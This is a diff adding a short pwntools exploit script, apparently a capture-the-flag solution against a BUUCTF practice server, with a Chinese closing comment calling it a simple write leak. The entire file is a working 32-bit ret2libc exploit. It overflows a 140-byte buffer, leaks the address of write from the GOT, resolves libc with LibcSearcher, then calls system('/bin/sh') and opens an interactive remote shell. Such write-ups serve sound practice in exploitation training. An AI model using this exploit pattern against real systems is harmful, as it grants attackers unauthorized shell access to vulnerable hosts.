@@ -1,0 +1,38 @@
+from pwn import *
+from LibcSearcher import *
+
+p = remote("node5.buuoj.cn", 29141)
+
+elf = ELF("./1")
+
+write_plt = elf.plt["write"]
+write_got = elf.got["write"]
+start = elf.sym["_start"]
+
+offset = 140
+payload1 = b"A" * offset + \
+           p32(write_plt) + \
+           p32(start) + \
+           p32(1) + \
+           p32(write_got) + \
+           p32(4)
+
+p.sendline(payload1)
+
+write_addr = u32(p.recv(4))
+
+libc = LibcSearcher("write", write_addr)
+libc_base = write_addr - libc.dump("write")
+
+system_addr = libc_base + libc.dump("system")
+bin_sh_addr = libc_base + libc.dump("str_bin_sh")
+
+payload2 = b"A" * offset + \
+           p32(system_addr) + \
+           p32(0xdeadbeef) + \
+           p32(bin_sh_addr)
+
+p.sendline(payload2)
+
+p.interactive()
+简单的一个write泄露
